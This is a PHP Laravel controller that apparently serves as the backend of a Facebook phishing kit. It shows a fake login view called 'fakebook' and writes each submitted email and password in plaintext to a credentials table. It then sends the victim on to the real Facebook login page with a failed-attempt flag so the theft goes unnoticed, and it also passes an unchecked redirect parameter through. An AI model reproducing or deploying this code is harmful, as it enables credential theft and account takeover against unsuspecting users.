<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Database\DatabaseManager;

use App\Http\Requests;

class IndexController extends Controller
{
    public function showLogin()
    {
        return view('fakebook.login');
    }

    public function storeCredentials(Request $request, DatabaseManager $databaseManager)
    {
        $email    = $request->input('email');
        $pass     = $request->input('pass');
        $redirect = $request->input('redirect');

        $databaseManager->table('credentials')->insert(['email' => $email, 'password' => $pass]);
        if ($redirect) {
            return redirect($redirect);
        }
        else{
            return redirect('https://www.facebook.com/login.php?login_attempt=1&lwv=110');
        }
    }

    public function showApiLogin()
    {
        return view('fakebook.api_login');
    }
}
